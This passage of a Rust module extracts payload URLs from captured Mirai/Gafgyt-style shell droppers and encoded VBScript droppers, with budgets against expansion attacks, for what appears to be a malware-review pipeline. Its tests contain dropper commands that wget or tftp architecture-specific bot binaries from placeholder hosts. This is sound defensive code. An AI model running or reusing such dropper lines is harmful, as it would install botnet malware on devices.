//! Embedded payload-URL extraction from a fetched dropper script.
//!
//! A captured HTTP/TFTP payload is often not the final malware binary but a shell dropper
//! (classic Mirai/Gafgyt `bins.sh` style) that fetches the real binaries itself, one per
//! architecture. This module is pure text scanning - no I/O, no shell execution - that pulls the
//! URLs such a script would fetch, so the review pipeline can queue them as follow-up fetches.
//!
//! This is deliberately NOT a shell interpreter. It resolves exactly two constructs real captured
//! loaders use:
//! - simple scalar assignments (`VAR="value"` / `VAR='value'` / `VAR=word`, one per line, last
//!   assignment wins, values may reference any other var in the body - forward or backward -
//!   each resolved once, and only when a url token, a `for` list or a `tftp` pair uses it, after
//!   the vars it references, see [`Vars`]);
//! - a single level of `for VAR in WORDS; do` where `WORDS` is either literal whitespace-separated
//!   words or a single `$OTHERVAR` resolved from the assignment map, truncated to `MAX_URLS` words
//!   before any expansion runs.
//!
//! Command substitution (`` $(...) ``, backticks), arithmetic (`$((...))`), parameter expansion
//! (`${VAR:-default}`), and nested loops are out of scope: any URL token that still contains an
//! unresolved `$` after assignment substitution and (at most one) loop expansion is dropped rather
//! than emitted as a broken template. `tftp -g -r <file> <host>` is synthesized into a
//! `tftp://<host>/<file>` URL using the same assignment substitution, but without loop expansion -
//! no captured loader has needed it, and adding it would widen the scope for no observed benefit.
//!
//! Total expansion work is bounded independent of any attacker-controlled repetition: a loop's
//! word list is truncated to `MAX_URLS` before expansion (so one url-token template expands to at
//! most `MAX_URLS` candidates, accepted or rejected), and the whole scan returns immediately once
//! `MAX_URLS` accepted urls have been emitted (so no further template is expanded at all). Without
//! both of these, a crafted body (a huge poisoned word list plus many repeated template lines that
//! never resolve) can drive tens of millions of rejected-candidate iterations in one synchronous
//! call, since a rejected candidate never touches the accepted-url cap.
//!
//! Total substitution output is bounded too. Every byte that variable resolution, url-token
//! substitution, `for`-word lookup and `tftp` synthesis produce is drawn from one [`Budget`] of
//! `MAX_EXPANSION_BYTES` per call, and no single resolved value or candidate may exceed
//! `MAX_RESOLVED_LEN`. Substitution can multiply text (`A=$A$A`, or a chain `A1=$A2$A2`,
//! `A2=$A3$A3`, ...), so without this a few bytes of input resolve to gigabytes: the campaign
//! indexer runs this on every captured shell command, and the daemon was OOM-killed by a six-byte
//! line. A value that would outgrow either bound stays unresolved, so a url that uses it keeps its
//! literal `$` and is dropped.

use std::collections::{HashMap, HashSet};

/// Bodies larger than this are not scanned; a legitimate dropper script is a few KB at most, and
/// this bounds the cost of the scan itself.
const MAX_BODY_LEN: usize = 64 * 1024;

/// Hard cap on emitted URLs. Without this, a `for` loop over a large word list could make the
/// fetcher enqueue an unbounded number of follow-up fetches - a fan-out amplification a malicious
/// script could trigger deliberately. The total-fetch budget is also enforced downstream; this is
/// the source-side guard.
const MAX_URLS: usize = 256;

/// Longest text one variable may resolve to, and longest url candidate one substitution may
/// produce: no larger than the largest body scanned. A loader's values are a host, a path or an
/// arch list, a few hundred bytes.
const MAX_RESOLVED_LEN: usize = MAX_BODY_LEN;

/// Total bytes every substitution in one `extract_urls` call may produce, summed over resolved
/// values, url candidates (accepted or rejected), `for` word lists taken from a variable and
/// `tftp` parts. Four bodies' worth: a real loader spends a few KB. Only values that a url token,
/// a `for` list or a `tftp` pair actually uses are resolved, so an assignment nothing refers to
/// costs nothing. Once spent, no further substitution succeeds, so work and memory stay O(body)
/// whatever the input does; a url written out literally is still taken.
const MAX_EXPANSION_BYTES: usize = 4 * MAX_BODY_LEN;

/// What is left of `MAX_EXPANSION_BYTES` for one call. Every byte a substitution produces is
/// charged here, through [`Budget::append`] or [`Budget::charge`]. Text that substitutes nothing
/// is a copy of the body and is not charged.
struct Budget {
    left: usize,
}

impl Budget {
    fn new() -> Self {
        Self {
            left: MAX_EXPANSION_BYTES,
        }
    }

    /// Append `s` to `out`, or refuse (`None`) when `out` would pass `MAX_RESOLVED_LEN` or the
    /// call's budget cannot cover it. A refused candidate is abandoned by the caller.
    fn append(&mut self, out: &mut String, s: &str) -> Option<()> {
        if out.len() + s.len() > MAX_RESOLVED_LEN || s.len() > self.left {
            return None;
        }
        self.left -= s.len();
        out.push_str(s);
        Some(())
    }

    /// Charge `n` bytes produced outside [`Budget::append`] (a `for` word list copied out of a
    /// resolved value).
    fn charge(&mut self, n: usize) -> Option<()> {
        if n > self.left {
            return None;
        }
        self.left -= n;
        Some(())
    }
}

/// Extract embedded `http://`, `https://`, and synthesized `tftp://` payload URLs from a captured
/// dropper script body. Returns an empty `Vec` if `body` is larger than 64 KB or is not valid
/// UTF-8 text.
pub fn extract_urls(body: &[u8]) -> Vec<String> {
    if body.len() > MAX_BODY_LEN {
        return Vec::new();
    }
    let Ok(text) = std::str::from_utf8(body) else {
        return Vec::new();
    };
    // Script Encoder (.vbe/.jse) is a fixed positional substitution, not encryption. A captured
    // dropper used it to hide a plain `strFileURL = "http://..."` assignment - exactly the shape
    // parsed below - so the follow-up payload was never queued. Decoding first closes that; a body
    // with no envelope passes through unchanged. See `super::vbe`.
    let decoded;
    let text: &str = match super::vbe::decode(text) {
        Some(d) => {
            decoded = d;
            &decoded
        }
        None => text,
    };

    let mut budget = Budget::new();
    let mut vars = Vars::parse(text);
    let mut loops = parse_for_loops(text);

    let mut urls = Vec::new();
    let mut seen = HashSet::new();

    for raw in scan_url_tokens(text) {
        // Check before doing any expansion work for this token, not just before accepting a
        // result: expand_token's internal loop is the expensive part, so once the cap is hit,
        // no further token should be expanded at all, regardless of how many raw tokens
        // scan_url_tokens found or how many of them are attacker-repeated identical templates.
        if urls.len() >= MAX_URLS {
            return urls;
        }
        for url in expand_token(&raw, &mut vars, &mut loops, &mut budget) {
            if urls.len() >= MAX_URLS {
                return urls;
            }
            if seen.insert(url.clone()) {
                urls.push(url);
            }
        }
    }

    for (file, host) in scan_tftp_pairs(text) {
        if urls.len() >= MAX_URLS {
            return urls;
        }
        vars.ensure(&file, &mut budget);
        vars.ensure(&host, &mut budget);
        let lookup = |name: &str| vars.get(name);
        let (Some(file_r), Some(host_r)) = (
            substitute_vars(&file, lookup, &mut budget),
            substitute_vars(&host, lookup, &mut budget),
        ) else {
            continue;
        };
        if file_r.contains('$') || host_r.contains('$') {
            continue;
        }
        let url = format!("tftp://{host_r}/{file_r}");
        if seen.insert(url.clone()) {
            urls.push(url);
        }
    }

    urls
}

/// The body's `VAR="value"` / `VAR='value'` / `VAR=word` assignments (one per line, a later
/// assignment to a name overwrites an earlier one), resolved lazily. A value may reference a var
/// assigned EARLIER OR LATER in the body.
///
/// Nothing is resolved at parse time: [`Vars::ensure`] resolves the vars a piece of text names,
/// when that text is about to be substituted. An assignment no url token, `for` list or `tftp`
/// pair refers to is never resolved and never spends [`Budget`], so a preamble of unrelated
/// assignments cannot starve the loader that follows (or precedes) it.
struct Vars {
    /// In first-assignment order, which makes resolution independent of hash order.
    raw: Vec<(String, String)>,
    /// Name to position in `raw` and `slots`.
    index: HashMap<String, usize>,
    slots: Vec<Slot>,
}

/// Where one assignment stands in [`Vars::resolve`].
enum Slot {
    /// Not reached yet.
    Pending,
    /// Its references are being resolved; a reference back to it is a cycle.
    Visiting,
    Resolved(String),
    /// Its value would pass `MAX_RESOLVED_LEN` or the budget. Final: the budget only shrinks.
    TooLarge,
}

impl Vars {
    fn parse(text: &str) -> Self {
        let mut raw: Vec<(String, String)> = Vec::new();
        let mut index: HashMap<String, usize> = HashMap::new();
        for line in text.lines() {
            let trimmed = line.trim_start();
            let Some(name_len) = leading_ident_len(trimmed) else {
                continue;
            };
            if name_len == 0 || trimmed.as_bytes().get(name_len) != Some(&b'=') {
                continue;
            }
            let name = &trimmed[..name_len];
            let value = raw_assignment_value(&trimmed[name_len + 1..]).to_string();
            match index.get(name) {
                Some(&i) => raw[i].1 = value,
                None => {
                    index.insert(name.to_string(), raw.len());
                    raw.push((name.to_string(), value));
                }
            }
        }
        let slots = raw.iter().map(|_| Slot::Pending).collect();
        Self { raw, index, slots }
    }

    /// The resolved value of `name`, if it has been resolved by [`Vars::ensure`] and fit.
    fn get(&self, name: &str) -> Option<&str> {
        match self.slots.get(*self.index.get(name)?)? {
            Slot::Resolved(v) => Some(v.as_str()),
            _ => None,
        }
    }

    /// Resolve every var `text` names, in the order it names them.
    fn ensure(&mut self, text: &str, budget: &mut Budget) {
        for name in find_var_refs(text) {
            self.ensure_name(name, budget);
        }
    }

    fn ensure_name(&mut self, name: &str, budget: &mut Budget) {
        if let Some(&root) = self.index.get(name) {
            self.resolve(root, budget);
        }
    }

    /// Resolve var `root` once, after the vars it references (a depth-first walk over `$NAME`
    /// references, on an explicit stack so a long chain cannot overflow the thread's stack),
    /// substituting only vars already resolved. A reference that is unknown, that closes a cycle
    /// (`A=$A`, `A=$A$A`, `A=$B` / `B=$A`) or that names a var whose value was too large is left
    /// as its literal `$NAME`, so any value built on it keeps a `$` and a url that uses it is
    /// dropped. Each value is substituted exactly once, against values that are themselves final,
    /// so the output is the sum of what [`Budget`] allowed - never the repeated squaring a
    /// re-substitute-until-stable loop gives `A=$A$A`. Already-resolved vars cost nothing.
    fn resolve(&mut self, root: usize, budget: &mut Budget) {
        if !matches!(self.slots[root], Slot::Pending) {
            return;
        }
        let mut stack = vec![root];
        while let Some(&top) = stack.last() {
            match self.slots[top] {
                Slot::Pending => {
                    self.slots[top] = Slot::Visiting;
                    for name in find_var_refs(&self.raw[top].1) {
                        // A repeated reference pushes its var again; the stale entry is popped
                        // as already resolved, and the pushes are bounded by the value's length.
                        if let Some(&dep) = self.index.get(name)
                            && matches!(self.slots[dep], Slot::Pending)
                        {
                            stack.push(dep);
                        }
                    }
                }
                Slot::Visiting => {
                    stack.pop();
                    let value = substitute_vars(
                        &self.raw[top].1,
                        |name| match self.index.get(name).map(|&i| &self.slots[i]) {
                            Some(Slot::Resolved(v)) => Some(v.as_str()),
                            _ => None,
                        },
                        budget,
                    );
                    self.slots[top] = value.map_or(Slot::TooLarge, Slot::Resolved);
                }
                Slot::Resolved(_) | Slot::TooLarge => {
                    stack.pop();
                }
            }
        }
    }

    /// Every var resolved, in first-assignment order (tests only: extraction resolves lazily).
    #[cfg(test)]
    fn resolved_map(mut self, budget: &mut Budget) -> HashMap<String, String> {
        for i in 0..self.raw.len() {
            self.resolve(i, budget);
        }
        self.raw
            .into_iter()
            .zip(self.slots)
            .filter_map(|((name, _), slot)| match slot {
                Slot::Resolved(v) => Some((name, v)),
                _ => None,
            })
            .collect()
    }
}

/// Length in bytes of a leading shell identifier (`[A-Za-z_][A-Za-z0-9_]*`) at the start of `s`,
/// or `None` if `s` does not start with an identifier character.
fn leading_ident_len(s: &str) -> Option<usize> {
    let mut chars = s.char_indices();
    match chars.next() {
        Some((_, c)) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return None,
    }
    let mut end = s.len();
    for (i, c) in chars {
        if !(c.is_ascii_alphanumeric() || c == '_') {
            end = i;
            break;
        }
    }
    Some(end)
}

/// Extract the raw value text after `VAR=` (quote-stripped, or the first unquoted word),
/// unsubstituted - [`Vars::resolve`] handles `$VAR` references afterward, once the whole map
/// is known.
fn raw_assignment_value(rest: &str) -> &str {
    if let Some(stripped) = rest.strip_prefix('"') {
        stripped.find('"').map_or(stripped, |end| &stripped[..end])
    } else if let Some(stripped) = rest.strip_prefix('\'') {
        stripped.find('\'').map_or(stripped, |end| &stripped[..end])
    } else {
        let end = rest
            .find(|c: char| c.is_whitespace() || c == ';' || c == '#')
            .unwrap_or(rest.len());
        &rest[..end]
    }
}

/// One `for VAR in WORDS` list: literal words, or a single `$OTHERVAR` resolved on first use.
enum LoopDef {
    Words(Vec<String>),
    Var(String),
}

struct Loops {
    defs: HashMap<String, LoopDef>,
    /// A `$OTHERVAR` list once taken from its value, charged to the budget exactly once; `None`
    /// when the budget could not cover it.
    taken: HashMap<String, Option<Vec<String>>>,
}

impl Loops {
    /// The word list of loop variable `name`, at most `MAX_URLS` words. A list named by a var is
    /// copied out of that var's resolved value on first use, so a `for` line nothing expands
    /// costs nothing.
    fn words(&mut self, name: &str, vars: &mut Vars, budget: &mut Budget) -> Option<&[String]> {
        if let LoopDef::Var(var) = self.defs.get(name)? {
            if !self.taken.contains_key(name) {
                vars.ensure_name(var, budget);
                let list: Vec<String> = vars
                    .get(var)
                    .map(|v| {
                        v.split_whitespace()
                            .take(MAX_URLS)
                            .map(str::to_string)
                            .collect()
                    })
                    .unwrap_or_default();
                let list = budget
                    .charge(list.iter().map(String::len).sum())
                    .map(|()| list);
                self.taken.insert(name.to_string(), list);
            }
            return self.taken.get(name)?.as_deref();
        }
        match self.defs.get(name)? {
            LoopDef::Words(w) => Some(w),
            LoopDef::Var(_) => None,
        }
    }
}

/// Parse `for VAR in WORDS; do` (or `for VAR in WORDS do`, or a `for` line whose `WORDS` runs to
/// end of line with `do` on the next line) into a map of loop variable -> word list. `WORDS` is
/// either literal whitespace-separated words or a single `$OTHERVAR` / `${OTHERVAR}`, resolved
/// from the assignments when [`Loops::words`] first needs it.
fn parse_for_loops(text: &str) -> Loops {
    let mut defs = HashMap::new();
    for line in text.lines() {
        let trimmed = line.trim();
        let Some(after_for) = trimmed.strip_prefix("for ") else {
            continue;
        };
        let mut tokens = after_for.split_whitespace();
        let Some(loop_var) = tokens.next() else {
            continue;
        };
        if !is_valid_ident(loop_var) {
            continue;
        }
        match tokens.next() {
            Some("in") => {}
            _ => continue,
        }

        let mut words: Vec<String> = Vec::new();
        for tok in tokens {
            if tok == "do" {
                break;
            }
            if let Some(stripped) = tok.strip_suffix(';') {
                if !stripped.is_empty() {
                    words.push(stripped.to_string());
                }
                break;
            }
            words.push(tok.to_string());
        }

        let var = if words.len() == 1 {
            single_var_ref(&words[0])
        } else {
            None
        };
        let def = match var {
            Some(name) => LoopDef::Var(name),
            None => LoopDef::Words(words),
        };
        let def = match def {
            // Cap the candidate word list before any expansion happens: expand_token iterates
            // every word for every matching url token found in the body, so an uncapped list
            // (e.g. a crafted "ARCHS" with tens of thousands of words) makes that iteration cost
            // attacker-controlled and unbounded by MAX_URLS, since a rejected (still-unresolved)
            // candidate never reaches the accepted-url cap check. Truncating here bounds total
            // expansion work to (url tokens found in the body) x MAX_URLS regardless of how large
            // or how many times a loop's word list is referenced.
            LoopDef::Words(mut w) => {
                w.truncate(MAX_URLS);
                LoopDef::Words(w)
            }
            var => var,
        };

        // Intentionally global and last-assignment-wins: if the body reuses the same loop
        // variable name across two different `for` loops, the later loop's word list wins for
        // both. Out of scope to fix - real captured Mirai/Gafgyt loaders use exactly one arch
        // loop.
        defs.insert(loop_var.to_string(), def);
    }
    Loops {
        defs,
        taken: HashMap::new(),
    }
}

/// If `word` is exactly `$NAME` or `${NAME}` (nothing else), return `NAME`.
fn single_var_ref(word: &str) -> Option<String> {
    if let Some(inner) = word.strip_prefix("${") {
        let name = inner.strip_suffix('}')?;
        return is_valid_ident(name).then(|| name.to_string());
    }
    let name = word.strip_prefix('$')?;
    is_valid_ident(name).then(|| name.to_string())
}

fn is_valid_ident(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// A URL token terminates on whitespace, a quote, `;`, `|`, `)`, `>`, or `&`.
fn is_terminator(ch: char) -> bool {
    ch.is_whitespace() || matches!(ch, '\'' | '"' | ';' | '|' | ')' | '>' | '&')
}

/// Scan `text` for raw `http://`/`https://` tokens (unresolved - variable substitution and loop
/// expansion happen in [`expand_token`]).
fn scan_url_tokens(text: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut idx = 0;
    while idx < text.len() {
        let rest = &text[idx..];
        let scheme_len = if rest.starts_with("https://") {
            8
        } else if rest.starts_with("http://") {
            7
        } else {
            0
        };
        if scheme_len > 0 {
            let mut end = idx + scheme_len;
            for (off, ch) in rest[scheme_len..].char_indices() {
                if is_terminator(ch) {
                    break;
                }
                end = idx + scheme_len + off + ch.len_utf8();
            }
            tokens.push(text[idx..end].to_string());
            idx = end;
        } else {
            let ch_len = rest.chars().next().map_or(1, |c| c.len_utf8());
            idx += ch_len;
        }
    }
    tokens
}

/// Scan for `tftp -g -r <file> <host>` invocations (whitespace-tokenized), returning raw
/// `(file, host)` pairs, unresolved.
fn scan_tftp_pairs(text: &str) -> Vec<(String, String)> {
    let tokens: Vec<&str> = text.split_whitespace().collect();
    let mut pairs = Vec::new();
    let mut i = 0;
    while i < tokens.len() {
        if tokens[i] == "tftp"
            && i + 4 < tokens.len()
            && tokens[i + 1] == "-g"
            && tokens[i + 2] == "-r"
        {
            pairs.push((tokens[i + 3].to_string(), tokens[i + 4].to_string()));
            i += 5;
        } else {
            i += 1;
        }
    }
    pairs
}

/// Resolve a raw URL token against assignments, then (if exactly one var remains unresolved and
/// it is a `for`-loop control variable) expand it into one URL per loop word. Returns an empty
/// `Vec` if the token cannot be fully resolved - never emits a URL with a literal `$` left in it.
/// Every candidate, accepted or rejected, is charged to `budget`.
fn expand_token(raw: &str, vars: &mut Vars, loops: &mut Loops, budget: &mut Budget) -> Vec<String> {
    vars.ensure(raw, budget);
    let Some(after_vars) = substitute_vars(raw, |name| vars.get(name), budget) else {
        return Vec::new();
    };
    if !after_vars.contains('$') {
        return vec![after_vars];
    }

    let mut refs = find_var_refs(&after_vars);
    let Some(loop_var) = refs.next() else {
        return Vec::new();
    };
    if refs.any(|other| other != loop_var) {
        return Vec::new();
    }
    let Some(words) = loops.words(loop_var, vars, budget) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for word in words {
        if budget.left == 0 {
            break;
        }
        let lookup = |name: &str| (name == loop_var).then_some(word.as_str());
        if let Some(expanded) = substitute_vars(&after_vars, lookup, budget)
            && !expanded.contains('$')
        {
            out.push(expanded);
        }
    }
    out
}

/// Replace every `$NAME` / `${NAME}` reference that `lookup` knows with its value. A reference it
/// does not know is left untouched (literal `$NAME` / `${NAME}` in the output) so a later stage
/// can decide whether it is a loop variable or truly unresolved. `None` when the result would
/// pass `MAX_RESOLVED_LEN` or the budget; nothing past that point is built.
fn substitute_vars<'v>(
    input: &str,
    lookup: impl Fn(&str) -> Option<&'v str>,
    budget: &mut Budget,
) -> Option<String> {
    let mut out = String::new();
    let mut literal_from = 0;
    let mut i = 0;
    while let Some(off) = input[i..].find('$') {
        let at = i + off;
        match var_ref_at(input, at) {
            Some((name, end)) => {
                if let Some(val) = lookup(name) {
                    budget.append(&mut out, &input[literal_from..at])?;
                    budget.append(&mut out, val)?;
                    literal_from = end;
                }
                i = end;
            }
            None => i = at + 1,
        }
    }
    if literal_from == 0 {
        // Nothing substituted: a copy of the input, which is part of the body.
        return Some(input.to_string());
    }
    budget.append(&mut out, &input[literal_from..])?;
    Some(out)
}

/// The variable name and end offset of a `$NAME` or `${NAME}` reference starting at the `$` at
/// byte offset `at`. `${...}` must hold only identifier characters, so `${VAR:-default}` (out of
/// scope parameter expansion) is not mistaken for a plain var.
fn var_ref_at(s: &str, at: usize) -> Option<(&str, usize)> {
    let bytes = s.as_bytes();
    let is_ident = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    match bytes.get(at + 1)? {
        b'{' => {
            let start = at + 2;
            let len = bytes[start..].iter().position(|&b| !is_ident(b))?;
            (bytes[start + len] == b'}').then(|| (&s[start..start + len], start + len + 1))
        }
        &b if b.is_ascii_alphabetic() || b == b'_' => {
            let start = at + 1;
            let len = bytes[start..]
                .iter()
                .position(|&b| !is_ident(b))
                .unwrap_or(bytes.len() - start);
            Some((&s[start..start + len], start + len))
        }
        _ => None,
    }
}

/// Every `$NAME` / `${NAME}` variable name referenced in `s`, in order, repeats included.
fn find_var_refs(s: &str) -> impl Iterator<Item = &str> {
    let mut i = 0;
    std::iter::from_fn(move || {
        while let Some(off) = s[i..].find('$') {
            let at = i + off;
            match var_ref_at(s, at) {
                Some((name, end)) => {
                    i = end;
                    return Some(name);
                }
                None => i = at + 1,
            }
        }
        i = s.len();
        None
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    // A Script-Encoded dropper hid its payload url from this extractor entirely: the body is
    // scanned as plain text, and encoded text contains no `http://` token. Decoded, it is the
    // ordinary assignment shape the extractor already handles. Documentation address, not the
    // real host the captured sample pointed at.
    #[test]
    fn decodes_a_script_encoded_dropper_before_extracting() {
        let plain = "Set WshShell = CreateObject(\"WScript.Shell\")\r\n\
                     strFileURL = \"http://198.51.100.72/tmp2.exe\"\r\n\
                     objXMLHTTP.open \"GET\", strFileURL, false\r\n";
        let encoded = super::super::vbe::tests::encode(plain);
        // Sanity: the encoded form must not contain the url in the clear, or this test proves
        // nothing about decoding.
        assert!(
            !encoded.contains("http://"),
            "fixture leaked the url in the clear"
        );
        assert_eq!(
            extract_urls(encoded.as_bytes()),
            vec!["http://198.51.100.72/tmp2.exe".to_string()]
        );
    }

    #[test]
    fn extracts_arch_urls_from_a_bins_script() {
        let s = b"#!/bin/sh\nwget http://5.6.7.8/mirai.x86 -O a; wget http://5.6.7.8/mirai.arm7\n\
                  busybox tftp -g -r m.mips 5.6.7.8\n";
        let urls = extract_urls(s);
        assert!(urls.contains(&"http://5.6.7.8/mirai.x86".to_string()));
        assert!(urls.contains(&"http://5.6.7.8/mirai.arm7".to_string()));
    }

    #[test]
    fn ignores_binary_and_oversize_bodies() {
        assert!(extract_urls(&[0u8, 159, 146, 150]).is_empty());
        assert!(extract_urls(&vec![b'a'; 70_000]).is_empty());
    }

    #[test]
    fn expands_interpolated_arch_loop_from_a_real_captured_loader() {
        let s = br#"#!/bin/sh
ARCHS="arm arm5 arm7 mips mpsl sh4 m68k ppc ppc440fp spc"
SERVER="198.51.100.72"
for arch in $ARCHS; do
  (wget "http://$SERVER/mirai.$arch" -O- || busybox wget "http://$SERVER/mirai.$arch" -O-) > hDvrHelper
done
"#;
        let urls = extract_urls(s);

        let expected = [
            "arm", "arm5", "arm7", "mips", "mpsl", "sh4", "m68k", "ppc", "ppc440fp", "spc",
        ];
        for arch in expected {
            let want = format!("http://198.51.100.72/mirai.{arch}");
            assert!(urls.contains(&want), "missing {want} in {urls:?}");
        }
        assert_eq!(
            urls.len(),
            expected.len(),
            "unexpected extra urls: {urls:?}"
        );
        assert!(
            urls.iter().all(|u| !u.contains('$')),
            "a template url leaked through: {urls:?}"
        );
    }

    #[test]
    fn substitutes_brace_form_variable() {
        let s = b"SERVER=1.2.3.4\nwget http://${SERVER}/x.bin\n";
        let urls = extract_urls(s);
        assert_eq!(urls, vec!["http://1.2.3.4/x.bin".to_string()]);
    }

    #[test]
    fn drops_url_with_unresolved_variable() {
        let s = b"wget http://$MISSING/x.bin\n";
        let urls = extract_urls(s);
        assert!(urls.is_empty(), "expected no urls, got {urls:?}");
    }

    #[test]
    fn caps_loop_expansion_at_256_and_does_not_hang() {
        let words: Vec<String> = (0..300).map(|i| format!("a{i}")).collect();
        let body = format!(
            "ARCHS=\"{}\"\nfor arch in $ARCHS; do\nwget http://5.6.7.8/x.$arch\ndone\n",
            words.join(" ")
        );
        let urls = extract_urls(body.as_bytes());
        assert_eq!(urls.len(), 256);
        assert!(urls.iter().all(|u| !u.contains('$')));
    }

    /// A crafted adversarial input: a for-loop word list where every word is itself
    /// unresolvable (so every candidate the loop expansion produces is REJECTED, never
    /// touching the accepted-url cap), combined with as many repeated template lines
    /// referencing that loop var as fit under the 64 KB body cap. Before per-loop word-list
    /// truncation, this drove (repeated template count) x (word list length) rejected
    /// expansion iterations - millions, entirely attacker-controlled and independent of
    /// MAX_URLS. See task-7-report.md for the mutation-verified pre-fix timing on this exact
    /// input.
    #[test]
    fn bounds_expansion_work_against_poisoned_repeated_templates() {
        // W (word-list length) and K (repeated template count) are both well past what a real
        // loader needs, chosen so pre-fix work (K x W ~= 2.5M rejected iterations) is clearly
        // unbounded by MAX_URLS while post-fix work (K x min(W, MAX_URLS) ~= 128K) still finishes
        // fast - see task-7-report.md for the mutation-verified timing comparison on this input.
        const W: usize = 5_000;
        const K: usize = 500;
        let poisoned_words: Vec<String> = (0..W).map(|i| format!("$X{i}")).collect();
        let archs_value = poisoned_words.join(" ");
        let mut body = format!("ARCHS=\"{archs_value}\"\nfor arch in $ARCHS; do\n");
        let template_line = "wget http://h/p.$arch\n";
        for _ in 0..K {
            body.push_str(template_line);
        }
        body.push_str("done\n");
        assert!(
            body.len() <= MAX_BODY_LEN,
            "test body must itself respect the 64KB cap: {}",
            body.len()
        );

        let start = std::time::Instant::now();
        let urls = extract_urls(body.as_bytes());
        let elapsed = start.elapsed();

        // Structural bound: never exceeds the cap, and here (every word is genuinely
        // unresolvable, no $Xn is ever assigned) the correct result is empty.
        assert!(
            urls.len() <= 256,
            "must never exceed the cap, got {}",
            urls.len()
        );
        assert!(
            urls.is_empty(),
            "no candidate here is resolvable, got {urls:?}"
        );
        // Not a precise perf gate (the real proof is the mutation-verified timing in the
        // report) - just a generous hang guard, since the fixed version finishes in well
        // under a second on this input.
        assert!(
            elapsed.as_secs() < 5,
            "expansion work must be bounded regardless of the attacker's repetition factor, took {elapsed:?}"
        );
    }

    #[test]
    fn resolves_forward_referenced_variable_chain() {
        // A is assigned before B, referencing it; B is assigned on a LATER line. A single
        // top-to-bottom pass would leave A as the literal "$B" forever.
        let s = b"A=$B\nB=host.example\nwget http://$A/payload.bin\n";
        let urls = extract_urls(s);
        assert_eq!(urls, vec!["http://host.example/payload.bin".to_string()]);
    }

    #[test]
    fn self_referential_assignment_terminates_without_hang() {
        let s = b"A=$A\nwget http://$A/x.bin\n";
        let start = std::time::Instant::now();
        let urls = extract_urls(s);
        let elapsed = start.elapsed();
        assert!(
            urls.is_empty(),
            "a self-reference must not resolve: {urls:?}"
        );
        assert!(
            elapsed.as_secs() < 2,
            "a self-reference must terminate quickly, took {elapsed:?}"
        );
    }

    /// The resolved assignment map, as `extract_urls` builds it.
    fn resolved(text: &str) -> HashMap<String, String> {
        Vars::parse(text).resolved_map(&mut Budget::new())
    }

    /// Resolution and extraction of `body` finish within a hang guard, no resolved value is
    /// longer than `MAX_RESOLVED_LEN`, and the resolved values together, like the urls emitted,
    /// stay within `MAX_EXPANSION_BYTES` plus the body's own length (what was substituted, plus
    /// text copied unchanged from the body): at most 320 KiB for a body of at most 64 KiB.
    fn assert_bounded(body: &str) -> (HashMap<String, String>, Vec<String>) {
        let bound = MAX_EXPANSION_BYTES + body.len();
        let start = std::time::Instant::now();
        let vars = resolved(body);
        let urls = extract_urls(body.as_bytes());
        let elapsed = start.elapsed();
        let longest = vars.values().map(String::len).max().unwrap_or(0);
        let total: usize = vars.values().map(String::len).sum();
        let url_total: usize = urls.iter().map(String::len).sum();
        assert!(longest <= MAX_RESOLVED_LEN, "a value of {longest} bytes");
        assert!(total <= bound, "values total {total} bytes");
        assert!(url_total <= bound, "urls total {url_total} bytes");
        assert!(elapsed.as_secs() < 2, "took {elapsed:?}");
        (vars, urls)
    }

    // A value that names itself twice squared its reference count on every pass of the old
    // re-substitute-until-stable loop (4, 16, 256, 65536, then 4.3e9 references by pass 5): the
    // six-byte shell line `A=$A$A` resolved to gigabytes, and the campaign indexer runs this on
    // every captured command, so it OOM-killed the daemon.
    #[test]
    fn a_doubled_self_reference_stays_its_own_text() {
        for (body, name, value) in [
            ("A=$A$A", "A", "$A$A"),
            ("A=$A$A$A\n", "A", "$A$A$A"),
            ("VAR2=$VAR2$VAR2", "VAR2", "$VAR2$VAR2"),
            ("X=${X}${X}; echo hi", "X", "${X}${X}"),
        ] {
            let (vars, urls) = assert_bounded(body);
            assert_eq!(vars.get(name).map(String::as_str), Some(value), "{body:?}");
            assert!(urls.is_empty(), "{body:?}: {urls:?}");
        }
    }

    #[test]
    fn a_mutual_cycle_with_repeated_references_stays_bounded() {
        let body = "A=$B\nB=$A$A$A$A\nwget http://$A/x.bin\nwget http://$B/y.bin\n";
        let (vars, urls) = assert_bounded(body);
        assert!(vars.values().all(|v| v.contains('$')), "{vars:?}");
        assert!(urls.is_empty(), "{urls:?}");
    }

    // Acyclic chains whose honest resolution is exponential: 17 lines of four references (319
    // bytes, 4^16 copies of the last value) and 4 lines of 1000 references (9 KB, 10^9 copies).
    // The values past MAX_RESOLVED_LEN stay unresolved and the url that uses them is dropped.
    #[test]
    fn an_exponential_reference_chain_stays_bounded() {
        let mut chain = String::new();
        for i in 1..17 {
            let next = format!("$A{}", i + 1);
            chain.push_str(&format!("A{i}={}\n", next.repeat(4)));
        }
        chain.push_str("A17=x\nwget http://$A1/x.bin\n");
        let (vars, urls) = assert_bounded(&chain);
        assert_eq!(vars["A13"], "x".repeat(256), "the short end still resolves");
        assert!(urls.is_empty(), "{urls:?}");

        let mut wide = String::new();
        for i in 1..4 {
            let next = format!("$B{}", i + 1);
            wide.push_str(&format!("B{i}=\"{}\"\n", next.repeat(1000)));
        }
        wide.push_str("B4=x\nwget http://$B1/x.bin\n");
        let (_, urls) = assert_bounded(&wide);
        assert!(urls.is_empty(), "{urls:?}");
    }

    // A url that names a large value many times is the same multiplication one step later, in
    // expand_token rather than in resolution.
    #[test]
    fn a_url_repeating_a_large_value_is_dropped_not_built() {
        let big = "b".repeat(30_000);
        let body = format!("H={big}\nwget http://{}/x\n", "$H".repeat(10_000));
        let (_, urls) = assert_bounded(&body);
        assert!(urls.is_empty(), "{} urls", urls.len());
    }

    /// Ordinary acyclic assignments that together resolve to more than `MAX_EXPANSION_BYTES`:
    /// P3 is 64 KiB, Q0 to Q2 take 192 KiB of the 256 KiB (Q2 is the first refused), and 47
    /// one-KiB copies of P1 take the 48128 bytes that are left, to the last byte. About 600 bytes.
    fn spending_preamble() -> String {
        let mut p = format!("P0={}\n", "x".repeat(64));
        p.push_str(&format!("P1={}\n", "$P0".repeat(16)));
        p.push_str(&format!("P2={}\n", "$P1".repeat(16)));
